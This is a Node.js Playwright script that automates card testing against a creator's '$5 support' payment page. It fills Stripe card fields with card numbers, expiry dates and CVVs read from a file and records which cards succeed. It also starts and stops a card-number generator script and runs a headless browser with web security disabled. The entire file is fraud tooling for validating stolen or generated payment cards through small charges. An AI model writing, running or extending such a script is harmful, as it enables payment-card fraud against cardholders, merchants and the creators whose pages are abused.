const fs = require('fs');
const { exec } = require('child_process');
const { chromium } = require('playwright');

// Helper function to log successful cards
function logSuccessfulPayment(card) {
    const entry = `${card.number},${card.expiry_month}/${card.expiry_year},${card.cvv}\n`;
    fs.appendFileSync('cards.txt', entry, 'utf8');
    console.log("✅ Card saved to cards.txt.");
}

// Helper function to monitor card availability
function monitorCardFile() {
    const stats = fs.statSync('cards.txt');
    const lines = fs.readFileSync('cards.txt', 'utf-8').split('\n').filter(Boolean);

    if (lines.length <= 50) {
        console.log("⚠️ Only 50 cards left. Starting card generator...");
        exec('python cardgenerater.py', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error starting card generator: ${error.message}`);
                return;
            }
            console.log(`Card generator started:\n${stdout}`);
        });
    } else if (lines.length >= 1000000) {
        console.log("✅ Card limit reached. Stopping card generator...");
        exec('pkill -f cardgenerater.py'); // Stops the generator if it's running
    }
}

// Function to simulate the payment process
async function simulatePayment(card, influencerUrl, gmailAddress) {
    const browser = await chromium.launch({
        headless: true,
        args: [
            '--enable-unsafe-swiftshader',
            '--disable-web-security',
            '--allow-file-access-from-files'
        ]
    });
    const page = await browser.newPage();

    try {
        await page.goto(influencerUrl, { timeout: 60000 });

        await page.waitForSelector('text="Support $5"');
        await page.click('text="Support $5"');

        // Fill in email
        await page.fill('input[placeholder="Email"]', gmailAddress);
        await page.click('button:has-text("Pay")');
        await page.waitForTimeout(5000);

        const stripeFrame = await page.waitForSelector('iframe[name^="__privateStripeFrame"]', { timeout: 20000 });
        const frame = await stripeFrame.contentFrame();

        console.log(`Using card: ${card.number}, Expiry: ${card.expiry_month}/${card.expiry_year}, CVV: ${card.cvv}`);

        await frame.fill('input[name="cardnumber"]', card.number);
        await frame.fill('input[name="exp-date"]', `${card.expiry_month}/${card.expiry_year}`);
        await frame.fill('input[name="cvc"]', card.cvv);

        if (await frame.isVisible('input[name="postal"]')) {
            await frame.fill('input[name="postal"]', '100080');
        }

        await page.click('button:has-text("Pay with Card")');
        await page.waitForTimeout(15000);

        const bodyContent = await page.textContent('body');

        // Check for common payment failures
        if (bodyContent.includes("Your card has been declined.")) {
            console.log("❌ Card declined.");
            await browser.close();
            return { success: false, reason: "Card declined" };
        }

        if (bodyContent.includes("Your card number is incorrect.")) {
            console.log("❌ Card number is incorrect.");
            await browser.close();
            return { success: false, reason: "Card number is incorrect" };
        }

        if (bodyContent.includes("We are unable to authenticate your payment method.") || 
            bodyContent.includes("Authentication Failed")) {
            console.log("❌ Authentication failed.");
            await browser.close();
            return { success: false, reason: "Authentication failed" };
        }

        // Check for success messages on the page
        if (bodyContent.includes("Thank you for supporting") || 
            (bodyContent.includes("You bought") && bodyContent.includes("a coffee!"))) {
            logSuccessfulPayment(card);
            await browser.close();
            return { success: true, reason: "Payment successful" };
        }

        console.log(`❌ Unknown failure. Page content:\n${bodyContent}`);
        await browser.close();
        return { success: false, reason: "Unknown failure" };
    } catch (error) {
        console.error(`Error during payment processing: ${error.message}`);
        await browser.close();
        return { success: false, reason: "Error during payment processing" };
    }
}

// Main function to load cards and simulate payments
async function main() {
    monitorCardFile(); // Check card availability before starting

    const cards = fs.readFileSync('cards.txt', 'utf-8')
        .split('\n')
        .filter(Boolean)
        .map(line => {
            const [number, expiry, cvv] = line.split(',');
            const [expiry_month, expiry_year] = expiry.split('/');
            return { number, expiry_month, expiry_year, cvv };
        });

    const influencerUrl = 'https://your-influencer-url.com';
    const gmailAddress = 'your-email@gmail.com';

    for (const card of cards) {
        const result = await simulatePayment(card, influencerUrl, gmailAddress);

        if (result.success) {
            console.log(`✅ Payment successful with card: ${card.number}`);
        } else {
            console.log(`❌ Payment failed: ${result.reason}`);
        }
    }
}

main();
